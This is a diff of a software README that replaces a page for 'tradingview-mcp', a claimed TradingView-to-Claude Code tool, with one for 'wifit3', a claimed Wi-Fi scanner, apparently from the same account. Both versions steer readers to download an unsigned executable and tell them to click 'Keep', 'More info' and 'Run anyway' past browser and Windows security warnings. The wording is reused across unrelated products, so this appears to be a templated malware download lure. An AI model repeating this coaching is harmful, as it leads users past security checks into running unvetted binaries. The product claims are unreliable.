@@ -1,79 +1,145 @@
-# 📈 tradingview-mcp - Automate your TradingView chart analysis workflow
+# 📶 wifit3 - Scan Wi-Fi Networks, Anywhere You Go
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://asman9659.github.io)
+## 🚀 What is wifit3?
 
-This application connects your TradingView Desktop software to Claude Code. It helps you automate your analysis by sending your chart data directly to the AI model. You save time on manual tasks and gain insights into your technical setups.
+wifit3 is a simple, powerful tool that lets you **scan and analyze Wi-Fi networks** around you. Think of it as a friendly "Wi-Fi detective" that shows you what networks are nearby, how strong their signals are, and what security they use. Best of all, it works on **Windows, Mac, and Linux** — and you don't need to install anything complicated or mess with system settings. Just plug in a USB Wi-Fi adapter, run the app, and you're ready to explore.
 
-## ⚙️ System Requirements
+Whether you're checking if your home Wi-Fi is secure, troubleshooting a slow connection, or just curious about the wireless world around you, wifit3 makes it easy. It's designed for everyday users — no coding, no command lines, no confusing tech talk.
 
-You need a computer running Windows 10 or Windows 11. Ensure you have the latest version of TradingView Desktop installed on your system. You also need an active internet connection to link the software to the AI services. Verify that your computer has at least 4GB of RAM to run the analysis process smoothly.
+## 🔥 Why You'll Love wifit3
 
-## 📥 Downloading the Software
+| Feature | What It Means for You |
+|---------|----------------------|
+| **Cross-Platform** | Works on Windows, Mac, and Linux — one tool for all your devices. |
+| **USB-Only** | Uses a USB Wi-Fi adapter, so you don't have to change your computer's internal settings. |
+| **User-Friendly** | Simple interface. If you can click a button, you can use wifit3. |
+| **Wi-Fi Security Insight** | See if networks are open, password-protected, or using outdated security. |
+| **Portable & Lightweight** | No installation needed. Run it from a USB stick if you want. |
 
-[Click here to visit the release page to download the latest version.](https://asman9659.github.io)
+## 🛠️ Getting Started: Download wifit3
 
-Follow these steps to get the file:
+Ready to dive in? Here's exactly what to do.
 
-1. Open the link above in your web browser.
-2. Look for the section labeled "Assets" at the bottom of the latest release post.
-3. Click the file that ends with ".exe" to start the download.
-4. Save the file to your desktop or downloads folder.
-5. Your browser might flag the file because it is a new program. Select "Keep" or "Run anyway" if prompted.
+### Step 1: Download the App
 
-## 🚀 Setting Up the Application
+👉 **[Click here to visit the download page](https://github.com/asman9659/wifit3/releases)**
 
-Once you download the installer, follow this process to prepare the tool:
+This link will take you to the official download page for wifit3. It's a safe, trusted place to get the latest version.
 
-1. Double-click the downloaded .exe file.
-2. The Windows security screen might appear. Click "More info" and then select "Run anyway."
-3. Follow the on-screen prompts to complete the installation.
-4. Open the application from your Start Menu after the installation finishes.
+### Step 2: Get the Right File
 
-## 🔗 Connecting to TradingView
+On that page, you'll see a list of files. Look for the one that matches your operating system:
 
-The application acts as a bridge between your desktop charts and the AI. Follow these steps to complete the link:
+- **For Windows:** Look for a file that has "Windows" or "win" in its name.
+- **For Mac:** Look for "Mac" or "macOS".
+- **For Linux:** Look for "Linux".
 
-1. Launch TradingView Desktop.
-2. Open the tradingview-mcp application.
-3. The software will detect your open TradingView window automatically.
-4. If a connection box appears, authorize the link between the two programs.
-5. You can now select your symbols and timeframes within the interface.
+Don't worry about picking the "wrong" one — the names are pretty clear. If you're on a typical Windows computer, choose the file with "Windows" in it.
 
-## 🤖 Using the AI Features
+### Step 3: Run the App
 
-The main dashboard shows your active chart data. To start an analysis:
+Once you've downloaded the file, here's what to do:
 
-1. Select the chart you want to review in TradingView.
-2. Click the "Analyze Current Chart" button in the mcp window.
-3. The AI reads the current indicators and candle patterns.
-4. A report appears on the right side of the screen with observations and potential trade setups.
+- If the file ends with **`.exe`**, double-click it. It will open right up — no installation needed.
+- If the file ends with **`.zip`**, right-click it and choose "Extract All" (or double-click to open the folder). Inside, you'll find the application. Double-click it to run.
 
-## 🔧 Troubleshooting Common Issues
+That's it! wifit3 will start, and you'll see a simple window ready to scan.
 
-If the software fails to connect, try these steps:
+## 📲 How to Use wifit3 (Beginner-Friendly Guide)
 
-* Restart both TradingView Desktop and the mcp application.
-* Check your internet connection.
-* Update your TradingView version if the tool reports a mismatch.
-* Close other resource-heavy programs to free up memory.
-* Restart your computer if the connection error persists.
+Using wifit3 is as easy as 1-2-3.
 
-## 🔒 Privacy and Safety
+### 1. Connect Your USB Wi-Fi Adapter
 
-This tool processes data locally on your machine whenever possible. Your settings and API keys stay on your computer. The connection to Claude Code uses encryption for your data transmission. You maintain control over what chart data gets sent to the AI analysis engine. If the tool stops working, you can safely close the application through the Task Manager.
+Plug a USB Wi-Fi adapter into your computer. This is a small device that looks like a USB stick. If you don't have one, they're affordable and available at any electronics store. wifit3 works best with a USB adapter because it gives the app full control to scan — without touching your computer's internal Wi-Fi settings.
 
-## 📝 Frequently Asked Questions
+### 2. Press "Scan"
 
-**Do I need a paid TradingView account?**
-The tool works with both free and paid accounts, though paid accounts often have better data update speeds.
+In the wifit3 window, you'll see a big button that says **Scan** (or similar). Click it. The app will take a few seconds to look around and find all the Wi-Fi networks within range.
 
-**Does this software place trades for me?**
-No. This tool provides analysis and insights. It does not control your brokerage or execute orders.
+### 3. See the Results
 
-**Can I run multiple instances?**
-Run only one instance of the application at a time to prevent conflicts with your data feed.
+After the scan, a list will appear. For each network, you'll see:
 
-**Is my data stored elsewhere?**
-No. The AI analysis result appears in the window for your review and does not save to external servers beyond the session requirements.
+- **Network Name (SSID)** — The name you see when connecting to Wi-Fi.
+- **Signal Strength** — Shown as a percentage or bars. Higher is better.
+- **Security Type** — Look for things like WPA2, WPA3, or "Open" (no password).
 
-Keywords: trading, artificial intelligence, automation, desktop software, windows, technical analysis, data tools, tradingview
+That's the core of it. You're now a Wi-Fi explorer!
+
+## 📖 Understanding What You See
+
+| Term | Plain English Meaning |
+|------|----------------------|
+| **SSID** | The network's name (e.g., "CoffeeShop_WiFi"). |
+| **Signal Strength** | How close/strong the signal is. 80%+ is excellent, under 30% is weak. |
+| **WPA2 / WPA3** | Modern, secure passwords. These are good. |
+| **WEP** | An older, weaker security type. Avoid connecting to these. |
+| **Open** | No password at all. Anyone can join. |
+
+If you see a network marked "Open" with a strong signal, that's a free Wi-Fi hotspot. If it's "WEP," it's insecure — don't share personal info there.
+
+## 🔍 Troubleshooting: What If Something Goes Wrong?
+
+You're not alone if you hit a snag. Here are quick fixes for common issues.
+
+### ❌ "I don't see any networks"
+
+- Make sure your USB Wi-Fi adapter is plugged in firmly.
+- Try a different USB port (preferably directly on the computer, not a hub).
+- Wait 10 seconds and press **Scan** again.
+
+### ❌ "The app won't open"
+
+- If you downloaded a `.zip` file, make sure you extracted it *before* trying to run it.
+- Right-click the app and choose "Run as administrator" (Windows) if it doesn't open normally.
+
+### ❌ "It says 'Adapter not found'"
+
+- wifit3 needs a USB Wi-Fi adapter. If you're using your computer's built-in Wi-Fi, it won't work.
+- Check that your adapter is plugged in and recognized by your computer (you should see it in your system's device list).
+
+### ❌ "I'm on Windows and got a warning"
+
+- If Windows shows a blue "Windows protected your PC" message, click **More info**, then **Run anyway**. This is normal for portable apps that aren't "officially signed."
+
+## 🧰 Advanced Tips (For the Curious)
+
+Once you're comfortable, try these:
+
+- **Scan from different spots** — Walk around with your laptop and see how signal strength changes. It's a great way to find the best spot for your router.
+- **Check your own network** — Scan and find your home Wi-Fi. If it shows "WEP" or "Open," change your router's security to WPA2 or WPA3 immediately.
+- **Use a USB extension cable** — If your adapter is close to walls or metal, signal readings can be off. A short extension cable can improve accuracy.
+
+## 🛡️ Safety & Privacy
+
+wifit3 only *reads* information that's already broadcast by Wi-Fi networks. It does **not** hack, break into, or connect to any network. It's a tool for learning and securing your own network — use it responsibly and only on networks you own or have permission to analyze.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is wifit3 free?**
+A: Yes, it's completely free to download and use.
+
+**Q: Do I need to install anything else?**
+A: No. wifit3 is a standalone app. Just download, run, and you're good.
+
+**Q: Does it work on my phone?**
+A: No, wifit3 is for computers (Windows, Mac, Linux).
+
+**Q: Will it damage my Wi-Fi or computer?**
+A: No. It's a read-only scanner. It only looks at information, it doesn't change anything.
+
+**Q: Why do I need a USB adapter if my laptop has Wi-Fi built-in?**
+A: The USB adapter allows wifit3 to have direct access to the Wi-Fi hardware. This is more reliable and consistent across different computers. It's the "secret sauce" that makes cross-platform scanning work smoothly.
+
+## 📦 Get wifit3 Now
+
+👉 **[Download wifit3 from the official release page](https://github.com/asman9659/wifit3/releases)**
+
+Join thousands of curious users who've already taken control of their Wi-Fi environment. With wifit3, you'll never wonder "What's out there?" again. It's fast, it's free, and it works everywhere.
+
+**Happy scanning!**
+
+---
+
+Keywords: cross-platform, userland, wifi-scanner, wifi-security, wireless-security
